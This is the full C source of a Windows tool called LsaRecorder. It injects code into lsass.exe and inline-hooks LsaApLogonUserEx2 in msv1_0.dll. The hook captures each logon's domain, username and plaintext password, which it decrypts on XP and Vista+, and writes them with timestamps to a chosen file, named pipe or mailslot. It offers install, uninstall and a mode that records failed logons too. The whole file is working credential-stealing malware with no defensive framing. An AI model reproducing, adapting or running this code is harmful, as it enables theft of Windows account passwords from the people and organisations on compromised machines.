#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <TlHelp32.h>
#include <shellapi.h>
#include <shlobj.h>
#include <Psapi.h>
#pragma comment (lib, "Psapi.lib")
#pragma comment (lib, "shell32.lib")

#include "ldasm/ldasm.h"

#define PAGE_SIZE			0x1000

#ifdef _AMD64_
#define INST_CODE_SIZE		14
#define STUB_DATA_ADDRESS	0x12345678FFFFFFFF
#else
#define INST_CODE_SIZE		8
#define STUB_DATA_ADDRESS	0x12345678
#endif

typedef LONG NTSTATUS;

typedef struct _UNICODE_STRING {
	USHORT	Length;
	USHORT	MaximumLength;
	PWSTR	Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef enum _CRED_PROTECTION_TYPE {
	CredUnprotected,
	CredUserProtection,
	CredTrustedProtection
} CRED_PROTECTION_TYPE, *PCRED_PROTECTION_TYPE;
typedef struct _SECURITY_SEED_AND_LENGTH {
	UCHAR Length;
	UCHAR Seed;
} SECURITY_SEED_AND_LENGTH, *PSECURITY_SEED_AND_LENGTH;

enum ACTIONSTATUS{Install, Uninstall};

//function pointer define
typedef SIZE_T (WINAPI *RTLCOMPAREMEMORY)(void *Source1, void *Source2, int Length);
typedef NTSTATUS (WINAPI *SYSFUNCTION007)(PUNICODE_STRING string, LPBYTE hash);
typedef BOOL (WINAPI *ISWOW64PROCESS) (HANDLE, PBOOL);
typedef NTSTATUS (WINAPI *LSAAPLOGONUSEREX2)(
	IN PVOID ClientRequest,	//PLSA_CLIENT_REQUEST
	IN DWORD LogonType,	//SECURITY_LOGON_TYPE
	IN PVOID ProtocolSubmitBuffer,
	IN PVOID ClientBufferBase,
	IN ULONG SubmitBufferSize,
	OUT PVOID *ProfileBuffer,
	OUT PULONG ProfileBufferSize,
	OUT PLUID LogonId,
	OUT PNTSTATUS SubStatus,
	OUT PVOID TokenInformationType, //PLSA_TOKEN_INFORMATION_TYPE
	OUT PVOID *TokenInformation,
	OUT PUNICODE_STRING *AccountName,
	OUT PUNICODE_STRING *AuthenticatingAuthority,
	OUT PUNICODE_STRING *MachineName,
	OUT PVOID PrimaryCredentials,	//PSECPKG_PRIMARY_CRED
	OUT PVOID * SupplementalCredentials //PSECPKG_SUPPLEMENTAL_CRED_ARRAY
	);
typedef HANDLE (WINAPI *CREATEFILEA)(
	__in     LPCSTR lpFileName,
	__in     DWORD dwDesiredAccess,
	__in     DWORD dwShareMode,
	__in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	__in     DWORD dwCreationDisposition,
	__in     DWORD dwFlagsAndAttributes,
	__in_opt HANDLE hTemplateFile
	);
typedef BOOL (WINAPI *WRITEFILE)(
	__in        HANDLE hFile,
	__in_bcount_opt(nNumberOfBytesToWrite) LPCVOID lpBuffer,
	__in        DWORD nNumberOfBytesToWrite,
	__out_opt   LPDWORD lpNumberOfBytesWritten,
	__inout_opt LPOVERLAPPED lpOverlapped
	);
typedef DWORD (WINAPI *SETFILEPOINTER)(
	__in        HANDLE hFile,
	__in        LONG lDistanceToMove,
	__inout_opt PLONG lpDistanceToMoveHigh,
	__in        DWORD dwMoveMethod
	);
typedef BOOL (WINAPI *CLOSEHANDLE)(
	__in HANDLE hObject
	);
typedef BOOL (WINAPI *CREDUNPROTECTW)(
	__in BOOL                                   fAsSelf,
	__in_ecount(cchProtectedCredentials) LPWSTR pszProtectedCredentials,
	__in DWORD                                  cchProtectedCredentials,
	__out_ecount_opt(*pcchMaxChars) LPWSTR      pszCredentials,
	__inout DWORD*                              pcchMaxChars
	);
typedef BOOL (WINAPI *CREDISPROTECTEDW)(
	__in LPWSTR                 pszProtectedCredentials,
	__out CRED_PROTECTION_TYPE* pProtectionType
	);
typedef VOID (NTAPI *RTLRUNDECODEUNICODESTRING)(
	UCHAR           Seed,
	PUNICODE_STRING String
	);
typedef HLOCAL (WINAPI *LOCALALLOC)(
	__in UINT uFlags,
	__in SIZE_T uBytes
	);
typedef HLOCAL (WINAPI *LOCALFREE)(
	__deref HLOCAL hMem
	);

typedef int (__cdecl *SWPRINTF)(
	wchar_t *string,
	const wchar_t *format,
	...
	);

typedef VOID (WINAPI *GETLOCALTIME)(
	__out LPSYSTEMTIME lpSystemTime
	);

LSAAPLOGONUSEREX2 gLsaApLogonUserEx2 = NULL;

typedef struct _RECORD_PSW_DATA
{
	CREATEFILEA					PtrCreateFileA;
	WRITEFILE					PtrWriteFile;
	SETFILEPOINTER				PtrSetFilePointer;
	CLOSEHANDLE					PtrCloseHandle;
	LSAAPLOGONUSEREX2			PtrLsaApLogonUserEx2;
	CREDUNPROTECTW				PtrCredUnProtectW;
	CREDISPROTECTEDW			PtrCredIsProtectedW;
	RTLRUNDECODEUNICODESTRING	PtrRtlRunDecodeUnicodeString;
	LOCALALLOC					PtrLocalAlloc;
	LOCALFREE					PtrLocalFree;
	GETLOCALTIME				PtrGetLocalTime;
	SWPRINTF					Ptrswprintf;
	DWORD						RecordType;
	CHAR						PswFilePath[MAX_PATH];
	WCHAR						CustomPattern[64];
}RECORD_PSW_DATA, *PRECORD_PSW_DATA;

typedef enum _SECURITY_LOGON_TYPE {
	UndefinedLogonType = 0, // This is used to specify an undefied logon type
	Interactive = 2,      // Interactively logged on (locally or remotely)
	Network,              // Accessing system via network
	Batch,                // Started via a batch queue
	Service,              // Service started by service controller
	Proxy,                // Proxy logon
	Unlock,               // Unlock workstation
	NetworkCleartext,     // Network logon with cleartext credentials
	NewCredentials,       // Clone caller, new default credentials
	//The types below only exist in Windows XP and greater
#if (_WIN32_WINNT >= 0x0501)
	RemoteInteractive,  // Remote, yet interactive. Terminal server
	CachedInteractive,  // Try cached credentials without hitting the net.
	// The types below only exist in Windows Server 2003 and greater
#endif
#if (_WIN32_WINNT >= 0x0502)
	CachedRemoteInteractive, // Same as RemoteInteractive, this is used internally for auditing purpose
	CachedUnlock        // Cached Unlock workstation
#endif
} SECURITY_LOGON_TYPE, *PSECURITY_LOGON_TYPE;
typedef enum _MSV1_0_LOGON_SUBMIT_TYPE {
	MsV1_0InteractiveLogon = 2,
	MsV1_0Lm20Logon,
	MsV1_0NetworkLogon,
	MsV1_0SubAuthLogon,
	MsV1_0WorkstationUnlockLogon = 7,
	// defined in Windows Server 2008 and up
	MsV1_0S4ULogon = 12,
	MsV1_0VirtualLogon = 82
} MSV1_0_LOGON_SUBMIT_TYPE, *PMSV1_0_LOGON_SUBMIT_TYPE;
typedef struct _MSV1_0_INTERACTIVE_LOGON {
	MSV1_0_LOGON_SUBMIT_TYPE MessageType;
	UNICODE_STRING LogonDomainName;
	UNICODE_STRING UserName;
	UNICODE_STRING Password;
} MSV1_0_INTERACTIVE_LOGON, *PMSV1_0_INTERACTIVE_LOGON;

/*****************************************************************************/
VOID RECORD_PSW_START(){}
BYTE* RecordPswDataAddress(){return (BYTE*)STUB_DATA_ADDRESS;}
NTSTATUS WINAPI NewLsaApLogonUserEx2(
	IN PVOID ClientRequest,	//PLSA_CLIENT_REQUEST
	IN SECURITY_LOGON_TYPE LogonType,	//SECURITY_LOGON_TYPE
	IN PVOID ProtocolSubmitBuffer,
	IN PVOID ClientBufferBase,
	IN ULONG SubmitBufferSize,
	OUT PVOID *ProfileBuffer,
	OUT PULONG ProfileBufferSize,
	OUT PLUID LogonId,
	OUT PNTSTATUS SubStatus,
	OUT PVOID TokenInformationType, //PLSA_TOKEN_INFORMATION_TYPE
	OUT PVOID *TokenInformation,
	OUT PUNICODE_STRING *AccountName,
	OUT PUNICODE_STRING *AuthenticatingAuthority,
	OUT PUNICODE_STRING *MachineName,
	OUT PVOID PrimaryCredentials,	//PSECPKG_PRIMARY_CRED
	OUT PVOID * SupplementalCredentials //PSECPKG_SUPPLEMENTAL_CRED_ARRAY
	)
{
	PRECORD_PSW_DATA Data = (PRECORD_PSW_DATA)RecordPswDataAddress();

	WCHAR DomainName[MAX_PATH];
	WCHAR UserName[MAX_PATH];
	WCHAR Password[MAX_PATH];
	DWORD DomainNameSize = 0;
	DWORD UserNameSize = 0;
	DWORD PasswordSize = 0;

	//ZeroMemory
	for (int i=0; i<MAX_PATH; i++)
	{
		DomainName[i] = 0;
		UserName[i] = 0;
		Password[i] = 0;
	}

	PVOID SubmitBufferCopy = (PVOID)Data->PtrLocalAlloc(LMEM_ZEROINIT,SubmitBufferSize);
	if (SubmitBufferCopy)
	{
#define AdjustPointer(b) ((PWSTR)((PCHAR)SubmitBufferCopy + ( (ULONG_PTR)b<(ULONG_PTR)ClientBufferBase ? (ULONG_PTR)b : (ULONG_PTR)b-(ULONG_PTR)ClientBufferBase)))

		for (int i=0; i<SubmitBufferSize; i++)
			((PCHAR)SubmitBufferCopy)[i] = ((PCHAR)ProtocolSubmitBuffer)[i];

		PMSV1_0_INTERACTIVE_LOGON Authentication = (PMSV1_0_INTERACTIVE_LOGON) SubmitBufferCopy;
		DomainNameSize = Authentication->LogonDomainName.Length;
		UserNameSize = Authentication->UserName.Length;
		PasswordSize = Authentication->Password.Length;

		if(Authentication->Password.Length > Authentication->Password.MaximumLength) 
		{
			//XP
			PUNICODE_STRING PasswordCopy = NULL;
			PUNICODE_STRING TempPassword = &Authentication->Password;
			UCHAR Seed = ((PSECURITY_SEED_AND_LENGTH)&TempPassword->Length)->Seed;
			TempPassword->Length &= 0xFF;
			TempPassword->Buffer = AdjustPointer(TempPassword->Buffer);
			if (Seed)
			{
				//发现XPUNICODE的Buffer不在Summit里面，避免破坏原数据(否则真实API得到数据有误)，拷贝一份
				PasswordCopy = (PUNICODE_STRING)Data->PtrLocalAlloc(LMEM_ZEROINIT, TempPassword->MaximumLength + sizeof(UNICODE_STRING));
				if (PasswordCopy)
				{
					PasswordCopy->Length = TempPassword->Length;
					PasswordCopy->MaximumLength = TempPassword->MaximumLength;
					PasswordCopy->Buffer = (PWSTR)((ULONG_PTR)PasswordCopy + sizeof(UNICODE_STRING));
					for (int i=0; i<TempPassword->Length; i++)
						((PCHAR)PasswordCopy->Buffer)[i] = ((PCHAR)TempPassword->Buffer)[i];
					Data->PtrRtlRunDecodeUnicodeString(Seed,PasswordCopy);	
					TempPassword = PasswordCopy;
				}
			}
			for (int i=0; i<TempPassword->Length; i++)
				((PCHAR)Password)[i] = ((PCHAR)TempPassword->Buffer)[i];
			if (PasswordCopy)
				Data->PtrLocalFree((HLOCAL)PasswordCopy);
		}
		else
		{
			//Vista+
			if (Data->PtrCredIsProtectedW && Data->PtrCredUnProtectW)
			{
				WCHAR TempBuff[MAX_PATH];
				for (int i=0; i<MAX_PATH; i++)
				{
					TempBuff[i] = 0;
				}
				for (int i=0; i<PasswordSize; i++)
				{
					((PCHAR)TempBuff)[i] = ((PCHAR)AdjustPointer(Authentication->Password.Buffer))[i];
				}
				CRED_PROTECTION_TYPE ProtectionType;
				if (Data->PtrCredIsProtectedW(TempBuff,&ProtectionType))
				{
					switch(ProtectionType)
					{
					case CredUnprotected:
						for (int i=0; i<PasswordSize; i++)
							((PCHAR)TempBuff)[i] = ((PCHAR)AdjustPointer(Authentication->Password.Buffer))[i];
						break;
					case CredUserProtection:
					case CredTrustedProtection:
						DWORD MaxCount = MAX_PATH-1;
						DWORD Count =PasswordSize/sizeof(WCHAR) + 1;
						Data->PtrCredUnProtectW(FALSE,TempBuff,Count,Password,&MaxCount);
						break;
					}
				}
			}
		}
		for (int i=0; i<UserNameSize; i++)
		{
			((PCHAR)UserName)[i] = ((PCHAR)AdjustPointer(Authentication->UserName.Buffer))[i];
		}
		for (int i=0; i<DomainNameSize; i++)
		{
			((PCHAR)DomainName)[i] = ((PCHAR)AdjustPointer(Authentication->LogonDomainName.Buffer))[i];
		}
		PasswordSize = 0;
		for (int i=0; Password[i]!=0; i++)
		{
			PasswordSize += sizeof(WCHAR);
		}
		Data->PtrLocalFree((HLOCAL)SubmitBufferCopy);
	}

	NTSTATUS Status = Data->PtrLsaApLogonUserEx2(
		ClientRequest,	//PLSA_CLIENT_REQUEST
		LogonType,	//SECURITY_LOGON_TYPE
		ProtocolSubmitBuffer,
		ClientBufferBase,
		SubmitBufferSize,
		ProfileBuffer,
		ProfileBufferSize,
		LogonId,
		SubStatus,
		TokenInformationType, //PLSA_TOKEN_INFORMATION_TYPE
		TokenInformation,
		AccountName,
		AuthenticatingAuthority,
		MachineName,
		PrimaryCredentials,	//PSECPKG_PRIMARY_CRED
		SupplementalCredentials //PSECPKG_SUPPLEMENTAL_CRED_ARRAY
		);
	if (PasswordSize)
	{
		if (Data->RecordType==1 || Status>=0)
		{
			HANDLE File = Data->PtrCreateFileA(Data->PswFilePath, GENERIC_ALL, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
			if (File != INVALID_HANDLE_VALUE)
			{
				DWORD WriteLen;
				SYSTEMTIME Systime;
				WCHAR CustomBuff[MAX_PATH];
				WCHAR Slash[]={L'\\'},Tab[]={L'\t'}, Crlf[]={L'\r',L'\n'};
				for (int i=0; i<MAX_PATH; i++)
				{
					CustomBuff[i] = 0;
				}
				DWORD CustomBuffSize = 0;
				Data->PtrSetFilePointer(File,0,NULL,FILE_END);
				Data->PtrGetLocalTime(&Systime);
				Data->Ptrswprintf(CustomBuff, Data->CustomPattern, Systime.wYear,Systime.wMonth,Systime.wDay,Systime.wHour,Systime.wMinute,Systime.wSecond,LogonType);
				for (int i=0; CustomBuff[i]!=0; i++)
					CustomBuffSize += sizeof(WCHAR);

				//LogonTime and LogonType
				Data->PtrWriteFile(File,CustomBuff,CustomBuffSize,&WriteLen,NULL);
				//DomainName
				Data->PtrWriteFile(File,DomainName,DomainNameSize,&WriteLen,NULL);
				Data->PtrWriteFile(File,Slash,2,&WriteLen,NULL);
				//UserName
				Data->PtrWriteFile(File,UserName,UserNameSize,&WriteLen,NULL);
				Data->PtrWriteFile(File,Tab,2,&WriteLen,NULL);
				//Password
				Data->PtrWriteFile(File,Password,PasswordSize,&WriteLen,NULL);
				Data->PtrWriteFile(File,Crlf,4,&WriteLen,NULL);
				Data->PtrCloseHandle(File);
			}
		}
	}
	return Status;
}
VOID RECORD_PSW_END(){}
/*****************************************************************************/

BOOL PrivelegeEscalation()
{
	//Lookup Privilege
	HANDLE hToken;
	LUID Luid;
	TOKEN_PRIVILEGES tp;
	OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken);
	LookupPrivilegeValue(NULL,SE_DEBUG_NAME,&Luid);
	tp.PrivilegeCount=1;
	tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid=Luid;
	AdjustTokenPrivileges(hToken,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL);
	CloseHandle(hToken);
	return TRUE;
}
BOOL EnumProcessId(char* ProcessName, DWORD* pid)
{
	PROCESSENTRY32 pe32;
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0); 
	if(hProcessSnap == INVALID_HANDLE_VALUE) { 
		return FALSE; 
	} 
	pe32.dwSize = sizeof(PROCESSENTRY32); 
	if(!Process32First(hProcessSnap, &pe32)) { 
		CloseHandle(hProcessSnap);  
		return FALSE; 
	}
	do
	{
		if(lstrcmpi(pe32.szExeFile, ProcessName)==0) 
		{
			*pid = pe32.th32ProcessID; 
			CloseHandle(hProcessSnap); 
			break;
		}
	}while (Process32Next(hProcessSnap, &pe32));
	return TRUE;
}
BOOL EnumProcessModule(HANDLE process, char* ModuleName, HMODULE* module)
{
	//Open Process 0x1FFFF
	HMODULE hMods[1024]={0};
	char name[MAX_PATH]={0};
	DWORD cbNeeded=0, i=0;

	EnumProcessModules(process, hMods, sizeof(hMods),&cbNeeded);
	if (cbNeeded<4) 
		return FALSE;
	do 
	{
		GetModuleBaseNameA(process, hMods[i], name, sizeof(name));
		if(_stricmp(name, ModuleName) == 0){
			*module = hMods[i];
			break;
		}
		i++;
	} while (i<=(cbNeeded>>2));

	return TRUE;
}
int CalcInstSize(char* buffer, int maxsize)
{
	//Caculate instruction count
	int instbytes = 0;
	while (1)
	{
		u32			len = 0;
		ldasm_data	ld;
		if (instbytes >= maxsize)
			break;		
#ifdef _AMD64_
		len = ldasm(buffer+instbytes, &ld, 1);
#else
		len = ldasm(buffer+instbytes, &ld, 0);
#endif
		if (ld.flags & F_INVALID)
			break;
		instbytes += len;
	}
	return instbytes;
}
#pragma pack(push,1)
typedef struct _INLINEHOOK_JMPING
{
#ifdef _AMD64_
	CHAR	MovInst[2];	//\x48\xb8
#else
	CHAR	MovInst[1];	//\xb8
#endif
	PVOID	Addr;
	CHAR	JmpInst[2];	//\xff\xe0
} INLINEHOOK_JMPING, *PINLINEHOOK_JMPING;
typedef struct _INLINEHOOK_TRAMPOLINE
{
	CHAR				Tramp[32];	//Entry + nop
	INLINEHOOK_JMPING	Jmping;		//Jmping
} INLINEHOOK_TRAMPOLINE, *PINLINEHOOK_TRAMPOLINE;
#pragma pack(pop)

BOOL InlineRemoteHook(HANDLE Process, PVOID Address, PVOID LocalCode, DWORD CodeSize, CHAR* PswFilePath, DWORD RecordType)
{
	//Init Jmping
#ifdef _AMD64_
	INLINEHOOK_JMPING Jmping = {{0x48,0xb8},NULL,{0xff,0xe0}};
#else
	INLINEHOOK_JMPING Jmping = {{0xb8},NULL,{0xff,0xe0}};
#endif

	//Init Trampoline
#ifdef _AMD64_
	INLINEHOOK_TRAMPOLINE Trampoline = {{0x90},{{0x48,0xb8},NULL,{0xff,0xe0}}};
#else
	INLINEHOOK_TRAMPOLINE Trampoline = {{0x90},{{0xb8},NULL,{0xff,0xe0}}};
#endif
	memset(Trampoline.Tramp, 0x90, sizeof(Trampoline.Tramp));

	//Setup EntryJmping/LocalCode/RecordPswData
	DWORD AllSize = CodeSize + sizeof(RECORD_PSW_DATA);
	BYTE* AllData = (BYTE*)malloc(AllSize);
	if (!AllData)
	{
		printf("[-] malloc failed, lasterror=%d", GetLastError());
		return FALSE;
	}
	memcpy(AllData+sizeof(RECORD_PSW_DATA), LocalCode, CodeSize);
	PRECORD_PSW_DATA Record = (PRECORD_PSW_DATA)AllData;
	Record->PtrCreateFileA = (CREATEFILEA)GetProcAddress(GetModuleHandleA("kernel32.dll"),"CreateFileA");
	Record->PtrWriteFile = (WRITEFILE)GetProcAddress(GetModuleHandleA("kernel32.dll"),"WriteFile");
	Record->PtrSetFilePointer = (SETFILEPOINTER)GetProcAddress(GetModuleHandleA("kernel32.dll"),"SetFilePointer");
	Record->PtrCloseHandle = (CLOSEHANDLE)GetProcAddress(GetModuleHandleA("kernel32.dll"),"CloseHandle");
	Record->PtrCredIsProtectedW = (CREDISPROTECTEDW)GetProcAddress(GetModuleHandleA("Advapi32.dll"),"CredIsProtectedW");
	Record->PtrCredUnProtectW = (CREDUNPROTECTW)GetProcAddress(GetModuleHandleA("Advapi32.dll"),"CredUnprotectW");
	Record->PtrRtlRunDecodeUnicodeString = (RTLRUNDECODEUNICODESTRING)GetProcAddress(GetModuleHandleA("ntdll.dll"),"RtlRunDecodeUnicodeString");
	Record->PtrLocalAlloc = (LOCALALLOC)GetProcAddress(GetModuleHandleA("kernel32.dll"),"LocalAlloc");
	Record->PtrLocalFree = (LOCALFREE)GetProcAddress(GetModuleHandleA("kernel32.dll"),"LocalFree");
	Record->PtrGetLocalTime = (GETLOCALTIME)GetProcAddress(GetModuleHandleA("kernel32.dll"),"GetLocalTime");
	Record->Ptrswprintf = (SWPRINTF)GetProcAddress(GetModuleHandleA("ntdll.dll"),"swprintf");
	Record->RecordType = RecordType;
	strcpy_s(Record->PswFilePath, PswFilePath);
	wcscpy_s(Record->CustomPattern, L"[%04d-%02d-%02d %02d:%02d:%02d] %d\t");

	BYTE* CodeData = AllData + sizeof(RECORD_PSW_DATA);
	PVOID RemoteAllData = VirtualAllocEx(Process, NULL, AllSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (RemoteAllData == NULL)
	{
		printf("[-] VirtualAllocEx failed, lasterror=%d\n", GetLastError());
		free(AllData);
		return FALSE;
	}
#ifdef _AMD64_
	printf("[+] VirtualAllocEx RemoteAllData %llx\n", RemoteAllData);
#else
	printf("[+] VirtualAllocEx RemoteAllData %x\n", RemoteAllData);
#endif

	//Replace address
	int i;
	BYTE* NeedFixAddr = CodeData +  (ULONG_PTR)RecordPswDataAddress - (ULONG_PTR)RECORD_PSW_START;
	DWORD NeedFixAddrRange = (ULONG_PTR)NewLsaApLogonUserEx2 - (ULONG_PTR)RecordPswDataAddress;
	for (i=0; i<NeedFixAddrRange; i++)
	{
#ifdef _AMD64_
		ULONG64 Flag = STUB_DATA_ADDRESS;
		if (memcmp(&NeedFixAddr[i],&Flag,sizeof(Flag)) == 0)
		{
			*(BYTE**)&NeedFixAddr[i] = (BYTE*)RemoteAllData;
			break;
		}
#else
		ULONG32 Flag = STUB_DATA_ADDRESS;
		if (memcmp(&NeedFixAddr[i],&Flag,sizeof(Flag)) == 0)
		{
			*(BYTE**)&NeedFixAddr[i] = (BYTE*)RemoteAllData;
			break;
		}
#endif
	}
	if (i == NeedFixAddrRange)
	{
		printf("[-] Can't found address flag\n");
		VirtualFreeEx(Process,RemoteAllData,0,MEM_RELEASE);
		free(AllData);
		return FALSE;
	}

	//Setup Jmping and Trampoline
	BYTE* PtrNewLsaApLogonUserEx2 = (BYTE*)RemoteAllData + (sizeof(RECORD_PSW_DATA) + (ULONG_PTR)NewLsaApLogonUserEx2 - (ULONG_PTR)RECORD_PSW_START);
	Jmping.Addr = PtrNewLsaApLogonUserEx2;

	//ReadEntry,Setup Trampoline
	CHAR Buffer[40] = {0};
	if (!ReadProcessMemory(Process,Address,Buffer,40,NULL))
	{
		printf("[-] ReadProcessMemory error %d",GetLastError());
		VirtualFreeEx(Process,RemoteAllData,0,MEM_RELEASE);
		free(AllData);
		return FALSE;
	}
	int InstSize = CalcInstSize(Buffer,INST_CODE_SIZE);
	printf("[+] Hook Instruction size %d\n", InstSize);

	memcpy(Trampoline.Tramp, Buffer, InstSize);
	Trampoline.Jmping.Addr = (PBYTE)Address + InstSize;
	PVOID RemoteTramp = VirtualAllocEx(Process, NULL, sizeof(Trampoline), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!RemoteTramp)
	{
		printf("[-] VirtualAllocEx RemoteTramp failed.\n");
		VirtualFreeEx(Process,RemoteAllData,0,MEM_RELEASE);
		free(AllData);
		return FALSE;
	}
#ifdef _AMD64_
	printf("[+] VirtualAllocEx RemoteTramp %llx\n", RemoteTramp);
#else
	printf("[+] VirtualAllocEx RemoteTramp %x\n", RemoteTramp);
#endif

	//Write Trampoline
	WriteProcessMemory(Process, RemoteTramp, &Trampoline, sizeof(Trampoline), NULL);

	//Write Struct
	Record->PtrLsaApLogonUserEx2 = (LSAAPLOGONUSEREX2)RemoteTramp;
	WriteProcessMemory(Process, RemoteAllData, AllData, AllSize, NULL);

	//Write Inline Hook Entry
	WriteProcessMemory(Process, Address, &Jmping, sizeof(Jmping), NULL);

	return TRUE;
}
BOOL InlineRemoteUnHook(HANDLE Process, PVOID RemoteAddress, PVOID LocalAddress)
{
	//ReadEntry,Setup Trampoline
	CHAR Buffer[40] = {0};
	if (!ReadProcessMemory(Process,LocalAddress,Buffer,40,NULL))
	{
		printf("[-] ReadProcessMemory error %d",GetLastError());
		return FALSE;
	}
	int InstSize = CalcInstSize(Buffer,INST_CODE_SIZE);
	printf("[+] Hook Instruction size %d\n", InstSize);
	if (WriteProcessMemory(Process, RemoteAddress, LocalAddress, InstSize, NULL))
	{
		printf("[+] WriteProcessMemory Instruction address ok.\n");
		return TRUE;
	}
	else
	{
		printf("[-] WriteProcessMemory Instruction address error. %d\n", GetLastError());
		return FALSE;
	}
}
BOOL IsWow64()
{
	//Is Win64
	BOOL bIsWow64=FALSE;
	ISWOW64PROCESS fnIsWow64Process;
	fnIsWow64Process = (ISWOW64PROCESS) GetProcAddress(GetModuleHandleA("kernel32"),"IsWow64Process");
	if(NULL != fnIsWow64Process) {
		fnIsWow64Process(GetCurrentProcess(),&bIsWow64);
	}
	return bIsWow64;
}
void RecordPswRoutine(ACTIONSTATUS action, char* PswFilePath, DWORD RecordType)
{
#ifndef _AMD64_
	if (IsWow64()) {
		printf("[-] Don't use in x64 system \n");
		return;
	}
#endif
	if (!PrivelegeEscalation())
	{
		printf("[-] Enable debug privelege failed.\n");
		return;
	}
	DWORD LsaPid;
	char* LsaProcessName = "lsass.exe";
	if (!EnumProcessId(LsaProcessName, &LsaPid))
	{
		printf("[-] Enum Lsa process id failed.\n");
		return;
	}
	HANDLE LsaProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, LsaPid);
	if (LsaProcess == NULL)
	{
		printf("[-] Open lsass.exe failed, LastError=%d\n", GetLastError());
		return;
	}

	PVOID RemotePtrLsaApLogonUserEx2 = NULL;
	PVOID LocalPtrLsaApLogonUserEx2 = NULL;
	HMODULE RemoteMsv10,LocalMsv10;
	if (!EnumProcessModule(LsaProcess,"msv1_0.dll", &RemoteMsv10))
	{
		printf("[-] Enum msv1_0.dll of lsass.exe  base failed.\n");
		return;
	}

	LocalMsv10 = LoadLibraryA("msv1_0.dll");
	if (!LocalMsv10)
	{
		printf("[-] Load msv1_0.dll failed. error %d\n",GetLastError());
		return;
	}
	LocalPtrLsaApLogonUserEx2 = GetProcAddress(LocalMsv10,"LsaApLogonUserEx2");
	RemotePtrLsaApLogonUserEx2 = (PVOID)((ULONG_PTR)LocalPtrLsaApLogonUserEx2 - (ULONG_PTR)LocalMsv10 + (ULONG_PTR)RemoteMsv10);

#ifdef _AMD64_
	printf("[+] msv1_0.dll of lsass.exe base: %llx.\n",RemoteMsv10);
	printf("[+] Local LsaApLogonUserEx2 %llx\n", LocalPtrLsaApLogonUserEx2);
	printf("[+] Remote LsaApLogonUserEx2 %llx\n", RemotePtrLsaApLogonUserEx2);
#else
	printf("[+] msv1_0.dll of lsass.exe base: %x.\n",RemoteMsv10);
	printf("[+] Local LsaApLogonUserEx2 %x\n", LocalPtrLsaApLogonUserEx2);
	printf("[+] Remote LsaApLogonUserEx2 %x\n", RemotePtrLsaApLogonUserEx2);
#endif

	if (action == Install)
	{
		DWORD CodeSize = (ULONG_PTR)RECORD_PSW_END - (ULONG_PTR)RECORD_PSW_START;
		if (InlineRemoteHook(LsaProcess, RemotePtrLsaApLogonUserEx2, RECORD_PSW_START, CodeSize, PswFilePath, RecordType))
			printf("[+] Install Password Logger ok, output file: %s.\n",PswFilePath);
		else
			printf("[-] Install Password Logger failed.\n");
	}
	else if(action == Uninstall)
	{
		if (InlineRemoteUnHook(LsaProcess, RemotePtrLsaApLogonUserEx2, LocalPtrLsaApLogonUserEx2))
			printf("[+] UnInstall Password Logger ok.\n");
		else
			printf("[-] UnInstall Password Logger failed.\n");
	}
	CloseHandle(LsaProcess);
}
int Usage()
{
	printf("Usage:\n");
	printf("\tLsaRecorder.exe [-r location] [-ar location] [-ur]\n");
	printf("Options:\n");
	printf("\t-r  LOCATION : Record Logon Password to Disk.Namepipe.Mailslot\n");
	printf("\t-ar LOCATION : Record Logon Password Whether logon success or not.\n");
	printf("\t-ur          : Uninstall Record Logon Password\n");
	return 0;
}
int main(int argc, char* argv[])
{
	if (argc == 3 && _stricmp(argv[1], "-r") == 0)
		RecordPswRoutine(Install, argv[2], 0);
	else if (argc == 3 && _stricmp(argv[1], "-ar") == 0)
		RecordPswRoutine(Install, argv[2], 1);
	else if (argc == 2 && _stricmp(argv[1], "-ur") == 0)
		RecordPswRoutine(Uninstall, argv[2], 0);
	else
		return Usage();	

	return 0;
}
